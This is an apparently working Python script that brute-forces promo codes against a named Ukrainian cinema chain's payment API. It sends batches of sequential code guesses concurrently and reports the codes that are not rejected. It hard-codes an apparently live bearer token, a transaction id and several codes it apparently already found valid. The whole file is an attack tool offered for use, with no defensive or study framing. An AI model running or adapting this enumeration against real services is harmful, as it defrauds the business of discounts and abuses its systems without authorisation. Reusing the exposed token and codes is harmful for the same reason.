import aiohttp
import asyncio
import async_timeout


PREV_VALID_CODES = (
    '20024911920338',
    '20024911977215',
    '20024911987830',
    '20024912018532',
)

# LAST_SAVEPOINT = '20024912018533'
LAST_SAVEPOINT = '20024912019325'
TRANSACTION_ID = 22076318
SEAT_ID = 100001
BATCH_SIZE = 100


async def get_json(session, url, params=None, headers=None):
    params = params or {}
    headers = headers or {}
    async with async_timeout.timeout(10):
        async with session.get(url, params=params, headers=headers) as response:
            return await response.json()


def check_results(results):
    last_code = int(LAST_SAVEPOINT)
    for index, item in enumerate(results):
        code = last_code + index
        mes = item['data']['user_Message']
        if 'не знайдено' in mes:
            print(code, 'is invalid')
        else:
            print(item)


async def main():
    url = 'https://pay.planetakino.ua/api/v1/cart/check-promocode'
    params = {
        'transactionId': TRANSACTION_ID,
        'promoCode': None,
        'theaterId': 'imax-kiev',
        'seatId': SEAT_ID,
    }
    headers = {
        'authorization': 'Bearer 4f6507711933412ba688b6c7849dff99',
    }
    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(BATCH_SIZE):
            code = int(LAST_SAVEPOINT) + i
            params.update({'promoCode': code})
            tasks.append(get_json(session, url, params, headers))

        responses = await asyncio.gather(*tasks)
        check_results(responses)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

